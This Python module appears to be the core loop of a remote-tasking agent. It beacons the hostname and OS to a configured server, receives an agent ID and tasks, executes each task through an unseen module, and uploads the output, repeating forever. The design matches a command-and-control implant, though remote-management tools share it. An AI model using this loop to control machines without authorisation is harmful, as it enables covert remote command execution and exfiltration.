import time
import socket
import platform
from . import config
from . import state
from . import comms
from . import tasking


def agent_iteration(api_url, results_url, sleep_interval):
    """
    The agent function responsible for executing a single iteration of the main
    lifecycle, including state-checking, check-in, and task processing.
    """

    agent_id = state.get_agent_id()
    hostname = socket.gethostname()
    os_name = f"{platform.system()} {platform.release()}"

    payload = {"hostname": hostname, "os_name": os_name}

    if agent_id:
        payload["agentId"] = agent_id

    response_checkin = comms.perform_checkin(api_url, payload)

    if response_checkin:
        if "agentId" in response_checkin:
            new_agent_id = response_checkin["agentId"]
            state.save_agent_id(new_agent_id)

        if "task" in response_checkin:
            received_task = response_checkin["task"]
            if received_task and received_task != "no-task-for-now":
                print("[INFO] Task received")
                command_out = tasking.execute_task(received_task)
                comms.send_results(results_url, agent_id, command_out)

    else:
        print(f"[INFO] Check-in failed. Trying again in {sleep_interval}s.")


def run_agent_loop():
    """
    The agent function responsible for loading the configuration and initiating
    the agent's main infinite loop.
    """

    api_url, sleep_interval, results_url = config.load_config()

    while True:
        try:
            agent_iteration(api_url, results_url, sleep_interval)
        except Exception as e:
            print(f"[ERROR] An error occurred in the iteration: {e}")

        time.sleep(sleep_interval)
